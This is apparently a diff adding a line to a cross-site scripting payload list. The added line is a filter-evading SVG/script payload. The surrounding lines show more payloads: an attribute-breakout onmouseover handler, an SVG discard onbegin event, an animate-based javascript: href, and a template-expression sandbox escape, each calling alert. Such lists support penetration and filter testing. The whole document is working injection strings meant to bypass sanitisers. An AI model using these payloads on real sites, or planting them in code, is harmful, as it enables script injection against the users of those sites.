@@ -1,5 +1,8 @@
 
 "onmouseover="alert(1)
+
+<svg<script> onmou<script>seover</script>="alert('xss')">hii</svg</script>>
+
 "><svg><discard%20onbegin=alert(1)>
 <svg><a><animate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F><text+x%3D20+y%3D20>Click%20me<%2Ftext><%2Fa>
 {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
